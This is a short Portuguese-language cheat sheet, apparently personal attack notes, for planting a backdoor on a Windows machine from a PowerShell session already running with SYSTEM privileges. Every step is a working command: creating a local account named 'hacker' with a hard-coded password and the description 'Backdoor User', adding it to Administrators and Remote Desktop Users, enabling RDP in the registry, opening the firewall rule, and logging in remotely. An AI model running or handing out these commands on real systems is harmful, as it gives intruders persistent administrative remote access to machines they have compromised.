
## Em um powershell com SYSTEM privilages

### criar um usuário adm

cria o usuário
``New-LocalUser -Name "hacker" -Password (ConvertTo-SecureString "Pass123!" -AsPlainText -Force) -FullName "Hacker" -Description "Backdoor User"``

adiciona ao grupo de adms
``Add-LocalGroupMember -Group "Administrators" -Member "hacker"``


### habilitar o RDP para o usuário criado

Adicionar o usuário ao grupo de acesso remoto
``net localgroup "Remote Desktop Users" hacker /add``

Habilitar conexões RDP no Registro do Windows
``reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f``

Liberar RDP no firewall
``netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes``

Depois disso é só logar com
para windows:
``mstsc /v:IP-DA-MAQUINA``

para linux:
``rdesktop IP-DA-MAQUINA``

